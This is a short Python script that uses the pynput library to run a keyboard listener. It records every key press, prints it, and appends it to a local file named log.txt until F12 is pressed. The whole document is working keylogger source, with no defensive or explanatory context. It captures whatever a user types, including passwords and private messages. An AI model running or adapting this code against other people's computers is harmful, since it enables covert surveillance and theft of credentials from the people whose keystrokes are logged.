

from pynput.keyboard import Listener
import time

def anonymous(key):

    key = str(key)
    key = key.replace("'","")
    
    if key == "Key.space":
        key=" "
    if key =="Key.backspace":
        key="•"
    if key =="Key.ctrl_l":
        key=""
    if key =="Key.shift":
        key="'HOA'"
    if key == "Key.enter":
        key= "\n" 



    
    print(key)
    


    with open("log.txt","a",encoding="utf-8") as me:
        me.write(key)

    
    if key=="Key.f12":
       raise SystemExit()
     
with Listener(on_press=anonymous) as lister:

    lister.join()
